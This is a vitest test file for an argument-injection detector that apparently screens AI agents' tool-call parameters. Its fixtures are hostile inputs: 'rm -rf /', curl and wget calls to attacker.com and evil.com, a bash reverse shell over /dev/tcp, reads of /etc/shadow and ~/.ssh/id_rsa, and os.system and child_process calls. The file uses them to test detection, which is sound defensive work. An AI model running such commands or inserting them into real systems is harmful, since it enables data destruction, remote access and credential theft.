/**
 * SINT Protocol — ASI05 Argument Injection Detector Tests.
 *
 * Tests the DefaultArgInjectionDetector for:
 * - Shell metacharacter detection
 * - Path traversal detection
 * - Environment variable injection detection
 * - Code pattern detection
 * - Nested object/array scanning
 * - Clean params (no false positives)
 * - Integration with PolicyGateway (high severity → deny, non-high → allowed)
 */

import { describe, it, expect, beforeEach } from "vitest";
import { DefaultArgInjectionDetector } from "../src/arg-injection-detector.js";
import { PolicyGateway } from "../src/gateway.js";
import {
  generateKeypair,
  generateUUIDv7,
  issueCapabilityToken,
} from "@sint-ai/gate-capability-tokens";
import type { SintCapabilityToken, SintRequest } from "@sint-ai/core";

// ── Helpers ──────────────────────────────────────────────────────────────────

function futureISO(hoursFromNow: number): string {
  const d = new Date(Date.now() + hoursFromNow * 3_600_000);
  return d.toISOString().replace(/\.(\d{3})Z$/, ".$1000Z");
}

const root = generateKeypair();
const agent = generateKeypair();

function makeToken(overrides?: {
  resource?: string;
  actions?: string[];
}): SintCapabilityToken {
  const result = issueCapabilityToken(
    {
      issuer: root.publicKey,
      subject: agent.publicKey,
      resource: overrides?.resource ?? "mcp://exec/*",
      actions: overrides?.actions ?? ["call"],
      constraints: {},
      delegationChain: { parentTokenId: null, depth: 0, attenuated: false },
      expiresAt: futureISO(12),
      revocable: true,
    },
    root.privateKey,
  );
  if (!result.ok) throw new Error(`Token issuance failed: ${result.error}`);
  return result.value;
}

function makeRequest(
  token: SintCapabilityToken,
  params: Record<string, unknown>,
  resource?: string,
): SintRequest {
  return {
    requestId: generateUUIDv7(),
    timestamp: new Date().toISOString().replace(/\.(\d{3})Z$/, ".$1000Z"),
    resource: resource ?? "mcp://exec/run",
    action: "call",
    params,
    agentId: agent.publicKey,
    tokenId: token.tokenId,
  };
}

// ── Unit tests: DefaultArgInjectionDetector ──────────────────────────────────

describe("DefaultArgInjectionDetector", () => {
  const detector = new DefaultArgInjectionDetector();

  // ── Shell metacharacter detection ──────────────────────────────────────────

  describe("shell metacharacter detection", () => {
    it("detects semicolon-followed-by-rm as high severity", () => {
      const result = detector.analyze(
        { command: "ls /tmp; rm -rf /" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
      expect(result.confidence).toBeGreaterThan(0.5);
      expect(result.patterns.some((p) => p.includes("shell"))).toBe(true);
    });

    it("detects && curl exfiltration pattern as high severity", () => {
      const result = detector.analyze(
        { args: ["list", "&& curl http://attacker.com/exfil"] },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
      expect(result.patterns.some((p) => p.includes("shell"))).toBe(true);
    });

    it("detects || bash execution as high severity", () => {
      const result = detector.analyze(
        { input: "safe || bash -i >& /dev/tcp/attacker.com/4444 0>&1" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects pipe to bash as high severity", () => {
      const result = detector.analyze(
        { command: "echo dGVzdA== | bash" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects $() subshell substitution as high severity", () => {
      const result = detector.analyze(
        { filename: "$(whoami)" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects backtick command substitution as high severity", () => {
      const result = detector.analyze(
        { path: "`id`" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects rm -rf / as high severity", () => {
      const result = detector.analyze(
        { command: "rm -rf /home/user" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects wget exfiltration as high severity", () => {
      const result = detector.analyze(
        { url: "wget http://evil.com/shell.sh" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });
  });

  // ── Path traversal detection ────────────────────────────────────────────────

  describe("path traversal detection", () => {
    it("detects ../../../etc/passwd pattern", () => {
      const result = detector.analyze(
        { path: "../../../etc/passwd" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("path-traversal"))).toBe(true);
    });

    it("detects /etc/shadow access as high severity", () => {
      const result = detector.analyze(
        { filename: "/etc/shadow" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects ~/.ssh/ access as high severity", () => {
      const result = detector.analyze(
        { path: "~/.ssh/id_rsa" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
      expect(result.patterns.some((p) => p.includes("ssh-keys"))).toBe(true);
    });

    it("detects /root/ path access as high severity", () => {
      const result = detector.analyze(
        { target: "/root/.bashrc" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects /proc/ path access", () => {
      const result = detector.analyze(
        { path: "/proc/self/environ" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("proc"))).toBe(true);
    });
  });

  // ── Environment variable injection ────────────────────────────────────────

  describe("environment variable injection", () => {
    it("detects $HOME usage", () => {
      const result = detector.analyze(
        { path: "$HOME/.ssh/id_rsa" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("env-inject"))).toBe(true);
    });

    it("detects $PATH injection", () => {
      const result = detector.analyze(
        { command: "echo $PATH" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("env-inject"))).toBe(true);
    });

    it("detects ${VARIABLE} brace expansion", () => {
      const result = detector.analyze(
        { target: "${HOME}/.config/secrets" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("dollar-brace"))).toBe(true);
    });

    it("detects %APPDATA% Windows variable", () => {
      const result = detector.analyze(
        { path: "%APPDATA%\\secrets.json" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(true);
      expect(result.patterns.some((p) => p.includes("appdata"))).toBe(true);
    });
  });

  // ── Python/subprocess code patterns ──────────────────────────────────────

  describe("code pattern detection", () => {
    it("detects 'import os' in string field", () => {
      const result = detector.analyze(
        { code: "import os; os.system('id')" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
      expect(result.patterns.some((p) => p.includes("import-os"))).toBe(true);
    });

    it("detects subprocess usage as high severity", () => {
      const result = detector.analyze(
        { script: "import subprocess; subprocess.run(['ls', '/etc'])" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
      expect(result.patterns.some((p) => p.includes("subprocess"))).toBe(true);
    });

    it("detects exec() call pattern as high severity", () => {
      const result = detector.analyze(
        { payload: "exec('import os; os.system(\"id\")')" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects eval() call pattern as high severity", () => {
      const result = detector.analyze(
        { data: "eval(compile('import os', '<string>', 'exec'))" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects os.system() call as high severity", () => {
      const result = detector.analyze(
        { body: "os.system('cat /etc/passwd')" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects Node.js require('child_process') as high severity", () => {
      const result = detector.analyze(
        { script: "const cp = require('child_process'); cp.execSync('id')" },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });
  });

  // ── Nested object/array scanning ─────────────────────────────────────────

  describe("nested object and array scanning", () => {
    it("detects injection pattern nested in object", () => {
      const result = detector.analyze(
        {
          config: {
            nested: {
              value: "; rm -rf /",
            },
          },
        },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects injection pattern in array element", () => {
      const result = detector.analyze(
        {
          args: ["safe-arg", "another-safe-arg", "&& curl http://attacker.com"],
        },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("detects injection in deeply nested array of objects", () => {
      const result = detector.analyze(
        {
          steps: [
            { name: "step1", cmd: "echo hello" },
            { name: "step2", cmd: "echo ok; wget http://attacker.com/backdoor.sh" },
          ],
        },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(true);
      expect(result.severity).toBe("high");
    });
  });

  // ── Clean params (no false positives) ────────────────────────────────────

  describe("clean params — no false positives", () => {
    it("clean filesystem read params are not detected", () => {
      const result = detector.analyze(
        { path: "/tmp/report.csv" },
        "mcp://filesystem/readFile",
      );
      expect(result.detected).toBe(false);
      expect(result.confidence).toBe(0);
    });

    it("clean exec params with a simple command are not detected", () => {
      const result = detector.analyze(
        { command: "ls", args: ["/tmp"] },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(false);
    });

    it("normal string fields with no injection patterns are clean", () => {
      const result = detector.analyze(
        {
          filename: "output.txt",
          content: "Hello, world!",
          tags: ["report", "2026"],
        },
        "mcp://filesystem/writeFile",
      );
      expect(result.detected).toBe(false);
      expect(result.severity).toBe("low");
    });

    it("empty params are clean", () => {
      const result = detector.analyze({}, "mcp://exec/run");
      expect(result.detected).toBe(false);
      expect(result.confidence).toBe(0);
    });

    it("numeric and boolean params are clean", () => {
      const result = detector.analyze(
        { count: 42, enabled: true, ratio: 0.75 },
        "mcp://exec/run",
      );
      expect(result.detected).toBe(false);
    });
  });

  // ── Severity levels and confidence ───────────────────────────────────────

  describe("severity and confidence", () => {
    it("path traversal with dotdot produces non-zero confidence", () => {
      const result = detector.analyze(
        { path: "../config.yaml" },
        "mcp://filesystem/readFile",
      );
      // dotdot alone triggers a match but severity is medium
      expect(result.patterns.some((p) => p.includes("dotdot"))).toBe(true);
      expect(result.confidence).toBeGreaterThan(0);
    });

    it("multiple patterns together increase confidence", () => {
      const single = detector.analyze(
        { cmd: "; rm -rf /" },
        "mcp://exec/run",
      );
      const multi = detector.analyze(
        { cmd: "; rm -rf /", script: "import os", path: "/etc/passwd" },
        "mcp://exec/run",
      );
      expect(multi.confidence).toBeGreaterThanOrEqual(single.confidence);
      expect(multi.patterns.length).toBeGreaterThan(single.patterns.length);
    });
  });
});

// ── Integration: PolicyGateway with argInjectionDetector ──────────────────

describe("PolicyGateway + argInjectionDetector (ASI05)", () => {
  let tokenStore: Map<string, SintCapabilityToken>;
  let gateway: PolicyGateway;

  beforeEach(() => {
    tokenStore = new Map();
    gateway = new PolicyGateway({
      resolveToken: (id) => tokenStore.get(id),
      argInjectionDetector: new DefaultArgInjectionDetector(),
    });
  });

  function storeToken(token: SintCapabilityToken): void {
    tokenStore.set(token.tokenId, token);
  }

  it("high-severity shell injection in exec params → deny with ARG_INJECTION_DETECTED", async () => {
    const token = makeToken({ resource: "mcp://exec/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { command: "ls /tmp; rm -rf /" });
    const decision = await gateway.intercept(req);

    expect(decision.action).toBe("deny");
    expect(decision.denial?.policyViolated).toBe("ARG_INJECTION_DETECTED");
  });

  it("high-severity code injection (import os) in exec params → deny", async () => {
    const token = makeToken({ resource: "mcp://exec/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { script: "import os; os.system('cat /etc/passwd')" });
    const decision = await gateway.intercept(req);

    expect(decision.action).toBe("deny");
    expect(decision.denial?.policyViolated).toBe("ARG_INJECTION_DETECTED");
  });

  it("high-severity /etc/shadow path traversal → deny", async () => {
    const token = makeToken({ resource: "mcp://filesystem/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { path: "/etc/shadow" }, "mcp://filesystem/readFile");
    const decision = await gateway.intercept(req);

    expect(decision.action).toBe("deny");
    expect(decision.denial?.policyViolated).toBe("ARG_INJECTION_DETECTED");
  });

  it("high-severity ~/.ssh/ path → deny", async () => {
    const token = makeToken({ resource: "mcp://filesystem/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { path: "~/.ssh/id_rsa" }, "mcp://filesystem/readFile");
    const decision = await gateway.intercept(req);

    expect(decision.action).toBe("deny");
    expect(decision.denial?.policyViolated).toBe("ARG_INJECTION_DETECTED");
  });

  it("medium-severity env var ($HOME) alone does NOT deny (only high → deny)", async () => {
    // $HOME is medium severity — the gateway only denies on high
    // However, combined with ssh key path it becomes high. Test pure $HOME usage.
    const token = makeToken({ resource: "mcp://filesystem/*", actions: ["call"] });
    storeToken(token);

    // Use $PATH which is medium severity — ensure gateway does not deny on medium
    const req = makeRequest(token, { message: "Your path is $PATH" }, "mcp://filesystem/writeFile");
    const decision = await gateway.intercept(req);

    // Medium severity must NOT cause deny from arg injection detector
    expect(decision.denial?.policyViolated).not.toBe("ARG_INJECTION_DETECTED");
  });

  it("clean params for exec command → escalate (T3_COMMIT), not arg-injection denied", async () => {
    const token = makeToken({ resource: "mcp://exec/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { command: "ls", args: ["/tmp"] });
    const decision = await gateway.intercept(req);

    // Should escalate because exec/run is T3_COMMIT, not deny due to injection
    expect(decision.denial?.policyViolated).not.toBe("ARG_INJECTION_DETECTED");
    expect(decision.action).toBe("escalate");
  });

  it("gateway without argInjectionDetector configured ignores injection patterns", async () => {
    const gatewayNoDetector = new PolicyGateway({
      resolveToken: (id) => tokenStore.get(id),
      // No argInjectionDetector
    });

    const token = makeToken({ resource: "mcp://filesystem/*", actions: ["call"] });
    storeToken(token);

    const req = makeRequest(token, { path: "~/.ssh/id_rsa" }, "mcp://filesystem/readFile");
    const decision = await gatewayNoDetector.intercept(req);

    // Without the plugin, no ARG_INJECTION_DETECTED
    expect(decision.denial?.policyViolated).not.toBe("ARG_INJECTION_DETECTED");
  });
});
